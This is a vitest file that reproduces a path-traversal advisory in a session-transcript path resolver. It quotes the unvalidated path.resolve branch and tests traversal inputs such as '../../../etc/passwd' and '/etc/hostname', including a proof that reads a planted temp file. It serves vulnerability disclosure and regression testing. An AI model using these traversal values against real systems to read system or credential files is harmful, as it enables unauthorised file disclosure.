/**
 * Reproduction for GHSA-rqpp-rjj8-7wv8 — path-traversal in
 * resolveSessionTranscriptCandidates when sessionFile is user-controlled,
 * storePath is undefined, and agentId is absent.
 *
 * The vulnerable code path (session-transcript-files.fs.ts, lines 99–109):
 *
 *   } else if (sessionFile) {
 *     if (agentId) { … }
 *     else {
 *       const trimmed = sessionFile.trim();
 *       if (trimmed) {
 *         candidates.push(path.resolve(trimmed));   // ← no validation
 *       }
 *     }
 *   }
 *
 * This directly resolves a user-supplied path with no base-directory
 * restriction, so values like "../../../etc/passwd" resolve to /etc/passwd.
 *
 * Run:  pnpm test src/gateway/session-transcript-files.fs.path-traversal.test.ts
 */
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, afterEach, beforeAll, describe, expect, test, vi } from "vitest";
import { readSessionMessages, resolveSessionTranscriptCandidates } from "./session-utils.fs.js";

describe("GHSA-rqpp-rjj8-7wv8: path traversal via sessionFile", () => {
  afterEach(() => {
    vi.unstubAllEnvs();
  });

  // ------------------------------------------------------------------
  // 1. resolveSessionTranscriptCandidates returns an arbitrary path
  //    when storePath=undefined, agentId=undefined, and sessionFile
  //    contains directory-traversal sequences.
  // ------------------------------------------------------------------
  test("resolveSessionTranscriptCandidates resolves traversal sessionFile to an arbitrary absolute path", () => {
    // Simulates an attacker passing a crafted sessionFile value.
    const maliciousSessionFile = "../../../etc/passwd";

    const candidates = resolveSessionTranscriptCandidates(
      "any-session-id",
      /* storePath */ undefined,
      /* sessionFile */ maliciousSessionFile,
      /* agentId */ undefined,
    );

    // The vulnerable code resolves this to an absolute path pointing at /etc/passwd
    // (or wherever the traversal leads from the current working directory).
    const resolvedMalicious = path.resolve(maliciousSessionFile);

    // BUG: the candidate list contains the traversal-resolved path.
    expect(candidates).toContain(resolvedMalicious);

    // The resolved path escapes any session directory — it points at /etc/passwd.
    expect(resolvedMalicious).toBe("/etc/passwd");
  });

  // ------------------------------------------------------------------
  // 2. readSessionMessages reads an arbitrary file's contents when
  //    given a traversal sessionFile, proving the full exploit chain.
  // ------------------------------------------------------------------
  test("readSessionMessages reads arbitrary file contents via traversal sessionFile", () => {
    // Create a temp file that simulates a sensitive file on disk,
    // formatted as JSONL so readSessionMessages can parse it.
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "ghsa-rqpp-test-"));
    const sensitiveFile = path.join(tmpDir, "secret-data.jsonl");

    // Write a valid JSONL transcript line so readSessionMessages parses it.
    fs.writeFileSync(
      sensitiveFile,
      JSON.stringify({ message: { role: "user", content: "SENSITIVE_DATA_LEAKED" } }) + "\n",
      "utf-8",
    );

    // Stub OPENCLAW_HOME to a non-existent dir so the legacy fallback doesn't
    // accidentally find a real file and mask the traversal.
    vi.stubEnv("OPENCLAW_HOME", path.join(tmpDir, "nonexistent-home"));

    // Compute a relative traversal path from the CWD to our temp file.
    const relativePath = path.relative(process.cwd(), sensitiveFile);

    // Call readSessionMessages with:
    //   storePath = undefined  (no store)
    //   sessionFile = relative traversal path
    // This triggers the vulnerable else-branch that does path.resolve(trimmed).
    const messages = readSessionMessages(
      "does-not-matter",
      /* storePath */ undefined,
      /* sessionFile */ relativePath,
    );

    // BUG: readSessionMessages successfully reads the file via the traversal path.
    expect(messages).toHaveLength(1);
    expect(messages[0]).toMatchObject({
      role: "user",
      content: "SENSITIVE_DATA_LEAKED",
    });

    // Cleanup.
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  // ------------------------------------------------------------------
  // 3. Absolute paths also bypass restrictions (no storePath, no agentId).
  // ------------------------------------------------------------------
  test("resolveSessionTranscriptCandidates allows absolute paths outside any session directory", () => {
    const absolutePath = "/etc/hostname";

    const candidates = resolveSessionTranscriptCandidates(
      "any-session-id",
      /* storePath */ undefined,
      /* sessionFile */ absolutePath,
      /* agentId */ undefined,
    );

    // BUG: the absolute path is included as-is with no directory restriction.
    expect(candidates).toContain(path.resolve(absolutePath));
  });

  // ------------------------------------------------------------------
  // 4. Contrast: when storePath IS provided, the traversal sessionFile
  //    is scoped through resolveSessionFilePath and may be safe.
  //    This shows the inconsistency — only the no-storePath path is vulnerable.
  // ------------------------------------------------------------------
  test("with storePath present, traversal sessionFile does NOT resolve to /etc/passwd", () => {
    const storePath = "/tmp/openclaw/agents/main/sessions/sessions.json";
    const maliciousSessionFile = "../../../etc/passwd";

    const candidates = resolveSessionTranscriptCandidates(
      "safe-session-id",
      storePath,
      maliciousSessionFile,
      /* agentId */ undefined,
    );

    // With storePath, the sessionFile is resolved via resolveSessionFilePath
    // which scopes it under the sessions directory — the raw traversal doesn't
    // appear as /etc/passwd.
    expect(candidates.some((c) => path.resolve(c) === "/etc/passwd")).toBe(false);
  });
});
